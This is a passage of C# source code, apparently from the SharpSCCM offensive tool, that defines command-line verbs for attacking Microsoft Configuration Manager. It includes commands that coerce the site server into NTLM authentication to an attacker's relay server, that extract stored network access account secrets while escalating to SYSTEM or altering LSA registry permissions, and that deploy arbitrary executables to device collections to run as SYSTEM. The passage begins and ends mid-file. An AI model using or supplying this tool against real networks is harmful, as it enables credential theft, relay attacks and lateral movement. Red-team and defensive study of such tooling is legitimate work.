                        if (!string.IsNullOrEmpty(managementPoint) && !string.IsNullOrEmpty(siteCode))
                        {
                            // work in progress
                            MgmtPointMessaging.SendContentLocationRequest(managementPoint, siteCode, "CHQ00004", 2);
                        }
                    });

                // get users
                var getUser = new Command("users", "Get information on users from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getUser);
                getUser.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getUser.Add(new Option<string>(new[] { "--name", "-n" }, "A user to search for (returns all users with names containing the provided string)"));
                getUser.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"UniqueUserName DESC\") (default: ascending (ASC) order)"));
                getUser.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p UniqueUserName\"") { Arity = ArgumentArity.OneOrMore });
                getUser.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getUser.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query, including escaped backslashes (e.g., \"UniqueUserName='APERTURE\\\\cave.johnson'\" or \"UniqueUserName LIKE '%cave.johnson%'\")"));
                getUser.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getUser.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string name, string orderBy, string[] properties, bool verbose, bool dryRun, string whereCondition) =>
                    {
                        if (!string.IsNullOrEmpty(name))
                        {
                            whereCondition = $"UniqueUserName LIKE '%{name}%'";
                        }
                        if (properties.Length == 0)
                        {
                            verbose = true;
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_R_User", null, count, properties, whereCondition, orderBy, dryRun, verbose, true, true);
                        }
                    });

                // invoke
                var invokeCommand = new Command("invoke", "A group of commands that execute actions on a management point");
                invokeCommand.AddGlobalOption(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                invokeCommand.AddGlobalOption(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                rootCommand.Add(invokeCommand);

                // invoke client-push
                var invokeClientPush = new Command("client-push", "Force the primary site server to authenticate to an arbitrary destination via NTLM using each configured account and its domain computer account\n" +
                    "  Requirements:\n" +
                    "    - Automatic site assignment and site-wide client push installation are enabled\n" +
                    "    - Fallback to NTLM authentication is not explicitly disabled (default)\n" +
                    "    - PKI certificates are not required for client authentication (default)\n" +
                    "    Examples:\n" +
                    "    - https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a\n" +
                    "    - https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1");
                invokeCommand.Add(invokeClientPush);
                invokeClientPush.Add(new Option<bool>(new[] { "--as-admin", "-a" }, "Connect to the server via WMI rather than HTTP to force authentication (requires Full Administrator access and device record for target)"));
                invokeClientPush.Add(new Option<string>(new[] { "--certificate", "-c" }, "The encoded X509 certificate blob to use that corresponds to a previously registered device"));
                invokeClientPush.Add(new Option<string>(new[] { "--client-id", "-i" }, "The SMS client GUID to use that corresponds to a previously registered device and certificate"));
                invokeClientPush.Add(new Option<string>(new[] { "--target", "-t" }, "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., \"192.168.1.1@8080\") of the relay/capture server (default: the machine running SharpSCCM)"));
                invokeClientPush.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool asAdmin, string certificate, string clientId, string target) =>
                    {
                        if (managementPoint == null || siteCode == null)
                        {
                            (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                        }
                        if (!string.IsNullOrEmpty(managementPoint) && !string.IsNullOrEmpty(siteCode))
                        {
                            if (!asAdmin)
                            {
                                // Use certificate of existing device if provided
                                if (!string.IsNullOrEmpty(certificate) && !string.IsNullOrEmpty(clientId))
                                {
                                    (MessageCertificateX509 signingCertificate, _, SmsClientId smsClientId) = MgmtPointMessaging.GetCertsAndClientId(managementPoint, siteCode, certificate, clientId);
                                    MgmtPointMessaging.SendDDR(signingCertificate, target, managementPoint, siteCode, smsClientId);
                                }
                                else if (!string.IsNullOrEmpty(certificate) && string.IsNullOrEmpty(clientId) || string.IsNullOrEmpty(certificate) && !string.IsNullOrEmpty(clientId))
                                {
                                    Console.WriteLine("[!] Both a certificate (-c) and SMS client GUID (-i) for a previously registered client must be specified when using this option");
                                }
                                // Otherwise, create a self-signed certificate and new device record
                                else
                                {
                                    MessageCertificateX509 signingCertificate = MgmtPointMessaging.CreateUserCertificate();
                                    SmsClientId smsClientId = MgmtPointMessaging.RegisterClient(signingCertificate, target, managementPoint, siteCode);
                                    MgmtPointMessaging.SendDDR(signingCertificate, target, managementPoint, siteCode, smsClientId);
                                }
                            }
                            else
                            {
                                if (!string.IsNullOrEmpty(target))
                                {
                                    MgmtPointWmi.GenerateCCR(target, managementPoint, siteCode);
                                }
                                else
                                {
                                    Console.WriteLine("[!] A target (-t) must be specified when using this option");
                                }
                            }
                        }
                    });

                // invoke query
                var invokeQuery = new Command("query", "Execute a given WQL query on a management point or other server\n" +
                    "  Permitted security roles:\n" +
                    "    - ACLs are applied at the object class and instance level");
                invokeCommand.Add(invokeQuery);
                invokeQuery.Add(new Argument<string>("query", "The WQL query to execute"));
                invokeQuery.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\SMS\\site_<site-code>\")"));
                invokeQuery.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string query, string wmiNamespace) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, wmiNamespace, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            string pattern = @"FROM\s+(\w+)";
                            Match match = Regex.Match(query, pattern);
                            if (match.Success)
                            {
                                string wmiClassName = match.Groups[1].Value;
                                MgmtUtil.GetClassInstances(wmiConnection, wmiClassName, query, printOutput: true);
                            }
                            else
                            {
                            Console.WriteLine("[!] Malformed query");
                            }
                        }
                    });

                // invoke update
                var invokeUpdate = new Command("update", "Force clients to check for updates and execute any new applications that are available\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Operations Administrator");
                invokeCommand.Add(invokeUpdate);
                invokeUpdate.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to force to update"));
                invokeUpdate.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to force to update"));
                invokeUpdate.Add(new Option<string>(new[] { "--policy-type", "-p" }, "The type of policy to update (default: \"machine\")").FromAmong(new string[] { "machine", "user" }));
                invokeUpdate.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to force to update"));
                invokeUpdate.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to force to update"));
                invokeUpdate.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to force to update (e.g., \"APERTURE\\cave.johnson\")"));
                invokeUpdate.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string device, string collectionId, string policyType, string collectionName, string resourceId, string user) =>
                    {

                        if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(resourceId) && string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n), CollectionID (-i), device Name (-d), user UniqueUserName (-u), or ResourceID (-r) to force to update");
                        }
                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                if (string.IsNullOrEmpty(policyType) || policyType == "machine")
                                {
                                    MgmtPointWmi.UpdateMachinePolicy(wmiConnection, collectionId, collectionName, device, resourceId, user);
                                }
                                else
                                {
                                    MgmtPointWmi.UpdateUserPolicy(wmiConnection, collectionId, collectionName, device, resourceId, user);
                                }
                            }
                        }
                    });

                // local
                var localCommand = new Command("local", "A group of commands to interact with the local workstation/server");
                rootCommand.Add(localCommand);

                // local classes
                var localClasses = new Command("classes", "Get a list of local WMI classes");
                localCommand.Add(localClasses);
                localClasses.Add(new Option<string>(new[] { "--wmi-namespace" , "-n" }, "The WMI namespace to query (default: \"root\\CCM\")"));
                localClasses.Handler = CommandHandler.Create(
                    (string wmiNamespace) =>
                    {
                        wmiNamespace = wmiNamespace ?? @"root\CCM";
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", wmiNamespace);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.PrintClasses(wmiConnection);
                        }
                    });

                // local class-instances
                var localClassInstances = new Command("class-instances", "Get information on local WMI class instances");
                localCommand.Add(localClassInstances);
                localClassInstances.Add(new Argument<string>("wmi-class", "The WMI class to query (e.g., \"SMS_Authority\")"));
                localClassInstances.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\CCM\")"));
                localClassInstances.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p ResourceName -p UniqueUserName\"") { Arity = ArgumentArity.OneOrMore });
                localClassInstances.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                localClassInstances.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"UniqueUserName='APERTURE\\cave.johnson'\" or \"UniqueUserName LIKE '%cave.johnson%'\")"));
                localClassInstances.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                // COUNT and ORDER BY don't seem to work when querying the local WMI repository
                localClassInstances.Handler = CommandHandler.Create(
                    (string wmiClass, string wmiNamespace, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", wmiNamespace);
                        if (properties.Length == 0)
                        {
                            verbose = true;
                        }
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            // Only get lazy properties if querying the ConfigMgr client WMI namespace ("root\CCM")
                            bool getLazyProps = string.IsNullOrEmpty(wmiNamespace) ? true : false;
                            MgmtUtil.GetClassInstances(wmiConnection, wmiClass, null, false, properties, whereCondition, null, dryRun, verbose, getLazyProps, true);
                        }
                    });

                // local class-properties
                var localClassProperties = new Command("class-properties", "Get all properties of a specified local WMI class");
                localCommand.Add(localClassProperties);
                localClassProperties.Add(new Argument<string>("wmi-class", "The WMI class to query (e.g., \"SMS_Authority\")"));
                localClassProperties.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\CCM\")"));
                localClassProperties.Handler = CommandHandler.Create(
                    (string wmiClass, string wmiNamespace) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", wmiNamespace);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            ManagementObject classInstance = new ManagementClass(wmiConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                            MgmtUtil.PrintClassProperties(classInstance);
                        }
                    });

                // local client-info
                var getLocalClientInfo = new Command("client-info", "Get the client software version for the local host via WMI");
                localCommand.Add(getLocalClientInfo);
                getLocalClientInfo.Handler = CommandHandler.Create(
                    new Action(() =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1");
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "CCM_InstalledComponent", null, false, new[] { "Version" }, "Name='SmsClient'", printOutput: true);
                        }
                    }));

                // local create-ccr
                var localCreateCCR = new Command("create-ccr", "Untested function to create a CCR that initiates client push installation to a specified target\n" +
                    "  Requirements:\n" +
                    "     - Local Administrators group membership on a management point\n" +
                    "     - ConfigMgr 2003 or 2007");
                localCommand.Add(localCreateCCR);
                localCreateCCR.Add(new Argument<string>("target", "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., \"192.168.1.1@8080\") of the relay/capture server"));
                localCreateCCR.Handler = CommandHandler.Create(
                    (string target) =>
                    {
                        string[] lines = { "[NT Client Configuration Request]", $"Machine Name={target}" };
                        System.IO.File.WriteAllLines("C:\\Program Files\\Microsoft Configuration Manager\\inboxes\\ccr.box\\test.ccr", lines);
                    });

                // local grep
                var localGrep = new Command("grep", "Search a specified file for a specified string");
                localCommand.Add(localGrep);
                localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
                localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
                localGrep.Handler = CommandHandler.Create(
                    (string stringToFind, string path) =>
                        ClientFileSystem.GrepFile(stringToFind, path)
                    );

                // local push-logs
                var localPushLogs = new Command("push-logs", "Search for evidence of client push installation");
                localCommand.Add(localPushLogs);
                localPushLogs.Handler = CommandHandler.Create(
                    new Action(() =>
                    {
                        //To-do
                        //LocalPushLogs();
                    }));

                // local query
                var localQuery = new Command("query", "Execute a given WQL query on the local system\n" +
                    "  Permitted security roles:\n" +
                    "    - ACLs are applied at the object class and instance level");
                localCommand.Add(localQuery);
                localQuery.Add(new Argument<string>("query", "The WQL query to execute"));
                localQuery.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\CCM\")"));
                localQuery.Handler = CommandHandler.Create(
                    (string query, string wmiNamespace) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", wmiNamespace, null);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, null, query, printOutput: true);
                        }
                    });

                // local secrets
                var getLocalSecrets = new Command("secrets", "Get policy secrets (e.g., network access accounts, task sequences, and collection variables) stored locally in the WMI repository\n" +
                    "  Requirements:\n" +
                    "     - Local Administrators group membership on a client");
                // local naa alias for backward compatibility
                getLocalSecrets.AddAlias("naa");
                localCommand.Add(getLocalSecrets);
                getLocalSecrets.Add(new Option<string>(new[] { "--method", "-m" }, "The method of obtaining the DPAPI-protected blobs: wmi or disk (note that the disk method can retrieve secrets that were changed or deleted") { IsRequired = true }.FromAmong(new string[] { "wmi", "disk" }));
                getLocalSecrets.Add(new Option<bool>(new[] { "--get-system", "-s" }, "Escalate to SYSTEM via token duplication (default is to modify and revert the permissions on the LSA secrets registry key)"));
                getLocalSecrets.Handler = CommandHandler.Create(
                    (string method, bool getSystem) =>
                    {
                        // default to registry permission modification
                        bool reg = true ? !getSystem : false;

                        if (Helpers.IsHighIntegrity())
                        {
                            if (method == "wmi")
                            {
                                Credentials.LocalSecretsWmi(reg);
                            }
                            else if (method == "disk")
                            {
                                Credentials.LocalSecretsDisk(reg);
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] SharpSCCM must be run with local administrator privileges to retrieve policy secret blobs");
                        }
                    });

                // local site-info
                var localSiteInfo = new Command("site-info", "Get the current management point and site code for the local host via WMI");
                localCommand.Add(localSiteInfo);
                localSiteInfo.Handler = CommandHandler.Create(
                    new Action(() =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1");
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_Authority", null, false, new[] { "CurrentManagementPoint", "Name" }, printOutput: true);
                        }
                    }));

                // local triage
                var localTriage = new Command("triage", "Gather information about the site from local log files");
                localCommand.Add(localTriage);
                localTriage.Handler = CommandHandler.Create(
                    new Action(() =>
                    {
                        ClientFileSystem.Triage();
                    }));

                // local user-sid
                var localUserSid = new Command("user-sid", "Get the hex SID for the current user");
                localCommand.Add(localUserSid);
                localUserSid.Handler = CommandHandler.Create(
                    new Action(() =>
                    {
                        Helpers.GetCurrentUserHexSid();
                    }));

                // new
                var newCommand = new Command("new", "A group of commands that create new objects by contacting a management point via WMI or HTTP(S)");
                newCommand.AddGlobalOption(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                newCommand.AddGlobalOption(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                rootCommand.Add(newCommand);

                // new admin
                //var newAdmin = new Command("admin", "Add a user to the RBAC_Admins table to obtain Full Administrator access to ConfigMgr console and WMI objects (requires local administrator privileges on the server running the site database)");
                //newCommand.Add(newAdmin);
                //newAdmin.Add(new Argument<string>("user-name", "The domain and user name you would like to grant Full Administrator privilege to (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
                //newAdmin.Handler = CommandHandler.Create(
                //    (string server, string siteCode, string userName) =>
                //    {
                //        var connection = Database.Connect(server, siteCode);
                //        Database.Query(connection, "SELECT * FROM RBAC_Admins");
                //    });

                // new application
                var newApplication = new Command("application", "Create an application by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Author\n" +
                    "    - Operations Administrator");
                newCommand.Add(newApplication);
                newApplication.Add(new Option<string>(new[] { "--name", "-n" }, "The name of the new application") { IsRequired = true });
                newApplication.Add(new Option<string>(new[] { "--path", "-p" }, "The local or UNC path of the binary/script the application will execute (e.g., \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe") { IsRequired = true });
                newApplication.Add(new Option<bool>(new[] { "--run-as-user", "-r" }, "Execute the application in the context of the logged on user (default: SYSTEM)"));
                newApplication.Add(new Option<bool>(new[] { "--show", "-s" }, "Show the application in the Configuration Manager console (default: hidden)"));
                newApplication.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string name, string path, bool runAsUser, bool show) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtPointWmi.NewApplication(wmiConnection, name, path, runAsUser, show);
                        }
                    });

                // new collection
                var newCollection = new Command("collection", "Create a collection of devices or users by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator\n" +
                    "    - Security Administrator");
                newCommand.Add(newCollection);
                newCollection.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the new collection") { IsRequired = true });
                newCollection.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of collection to create (\"device\" or \"user\")") { IsRequired = true }.FromAmong(new string[] { "device", "user" }));
                newCollection.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string collectionName, string collectionType) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtPointWmi.NewCollection(wmiConnection, collectionType, collectionName);
                        }
                    });

                // new collection-member
                var newCollectionMember = new Command("collection-member", "Add a device to a collection by contacting a management point via WMI\n " +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator\n" +
                    "    - Security Administrator\n");
                newCommand.Add(newCollectionMember);
                newCollectionMember.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to add to the specified collection"));
                newCollectionMember.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to add the specified device or user to"));
                newCollectionMember.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to add the specified device or user to"));
                newCollectionMember.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to add to the specified collection"));
                newCollectionMember.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
                newCollectionMember.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to add to the specified collection, including escaped backslashes (e.g., \"APERTURE\\\\cave.johnson\")"));
                newCollectionMember.Add(new Option<int>(new[] { "--wait-time", "-w" }, "The time (in seconds) to wait for the collection to populate before displaying new collection members (default: 15 seconds)"));
                newCollectionMember.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string device, string collectionId, string collectionName, string resourceId, string collectionType, string user, int waitTime) =>
                    {

                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId))
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n) or CollectionID (-i) to add a member to");
                        }
                        else if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user) && string.IsNullOrEmpty(resourceId))
                        {
                            Console.WriteLine("[!] Please specify a device Name (-d), user UniqueUserName (-u), or ResourceID (-r) to add to the collection");
                        }
                        else if (!string.IsNullOrEmpty(resourceId) && (string.IsNullOrEmpty(collectionType) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user)))
                        {
                            Console.WriteLine("[!] Please specify a collection type (-t), a device Name (-d), or user UniqueUserName (-u) when using a ResourceID (-r)");
                        }
                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            { 
                                MgmtPointWmi.NewCollectionMember(wmiConnection, collectionName, collectionType, collectionId, device, user, resourceId, waitTime == 0 ? 15 : waitTime);
                            }
                        }
                    });

                // new deployment
                var newDeployment = new Command("deployment", "Create an assignment to deploy an application to a collection by contacting a management via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Deployment Manager\n" +
                    "    - Operations Administrator");
                newCommand.Add(newDeployment);
                newDeployment.Add(new Option<string>(new[] { "--application-name", "-a" }, "The name of the application to deploy") { IsRequired = true });
                newDeployment.Add(new Option<string>(new[] { "--collection-name", "-c" }, "The name of the collection to deploy the application to"));
                newDeployment.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to add the specified device or user to"));
                newDeployment.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string applicationName, string collectionName, string collectionId) =>
                    {
                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId))
                        {
                            Console.WriteLine("[!] Please provide a collection Name (-c) or CollectionID (-i) to deploy the application to");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                MgmtPointWmi.NewDeployment(wmiConnection, applicationName, collectionName, collectionId);
                            }
                        }
                    });

                // new device
                var newDevice = new Command("device", "Create a new device record and obtain a reusable certificate for subsequent requests (experimental)\n" +
                    "  Requirements:\n" +
                    "    - PKI certificates are not required for client authentication (default)");
                newCommand.Add(newDevice);
                newDevice.Add(new Option<string>(new[] { "--name", "-n" }, "The NetBIOS name, IP address, or IP address and port (e.g., \"192.168.1.1@8080\") of the new device") { IsRequired = true });
                newDevice.Add(new Option<string>(new[] { "--password", "-p" }, "The password for the specified computer account (required to get secrets)"));
                newDevice.Add(new Option<string>(new[] { "--username", "-u" }, "The name of the computer account to register the new device record with, including the trailing \"$\" (required to get secrets)"));
                newDevice.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string name, string password, string username) =>
                    {
                        if (managementPoint == null || siteCode == null)
                        {
                            (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                        }
                        if (!string.IsNullOrEmpty(managementPoint) && !string.IsNullOrEmpty(siteCode))
                        {
                            if ((!string.IsNullOrEmpty(username) && string.IsNullOrEmpty(password)) || (!string.IsNullOrEmpty(password) && string.IsNullOrEmpty(username)))
                            {
                                Console.WriteLine("[!] Both a computer account name (-u) and computer account password (-p) must be specified when using either option");
                            }
                            else
                            {
                                MgmtPointMessaging.GetCertsAndClientId(managementPoint, siteCode, null, null, username, password, name);
                            }
                        }
                    });

                // remove
                var removeCommand = new Command("remove", "A group of commands that deletes objects by contacting a management point via WMI");
                removeCommand.AddGlobalOption(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                removeCommand.AddGlobalOption(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                rootCommand.Add(removeCommand);

                // remove application
                var removeApplication = new Command("application", "Delete a specified application by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Author\n" +
                    "    - Operations Administrator");
                removeCommand.Add(removeApplication);
                removeApplication.Add(new Argument<string>("name", "The LocalizedDisplayName of the application to delete"));
                removeApplication.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string name) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            Cleanup.RemoveApplication(wmiConnection, name);
                        }
                    });

                // remove collection
                var removeCollection = new Command("collection", "Delete a specified collection by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator\n" +
                    "    - Security Administrator");
                removeCommand.Add(removeCollection);
                removeCollection.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to remove (e.g., \"PS100020\""));
                removeCollection.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to remove"));
                removeCollection.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string collectionId, string collectionName) =>
                    {
                        if (string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName)) 
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n) or CollectionID (-i) to remove");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                Cleanup.RemoveCollection(wmiConnection, collectionName, collectionId);
                            }
                        }
                    });

                // remove collection-member
                var removeCollectionMember = new Command("collection-member", "Remove a device from a collection by by contacting a management point via WMI and adding a collection rule to explicitly exclude it\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator\n" +
                    "    - Security Administrator\n");
                removeCommand.Add(removeCollectionMember);
                removeCollectionMember.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to exclude from the specified collection"));
                removeCollectionMember.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to exclude the resource from (e.g., \"PS100020\""));
                removeCollectionMember.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to exclude the specified device or user from"));
                removeCollectionMember.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
                removeCollectionMember.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to exclude from the specified collection, including escaped backslashes (e.g., \"APERTURE\\\\cave.johnson\")"));
                removeCollectionMember.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to exclude from the specified collection"));
                removeCollectionMember.Add(new Option<int>(new[] { "--wait-time", "-w" }, "The time (in seconds) to wait for the excluded collection to populate before displaying updated collection members (default: 15 seconds)"));
                removeCollectionMember.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string device, string collectionId, string collectionName, string collectionType, string user, string resourceId, int waitTime) =>
                    {
                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId))
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n) or CollectionID (-i) to remove a member from");
                        }
                        else if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user) && string.IsNullOrEmpty(resourceId))
                        {
                            Console.WriteLine("[!] Please specify a device Name (-d), user UniqueUserName (-u), or ResourceID (-r) to remove from the collection");
                        }
                        else if (!string.IsNullOrEmpty(resourceId) && (string.IsNullOrEmpty(collectionType) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user)))
                        {
                            Console.WriteLine("[!] Please specify a collection type (-t), a device Name (-d), or user UniqueUserName (-u) when using a ResourceID (-r)");
                        }
                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
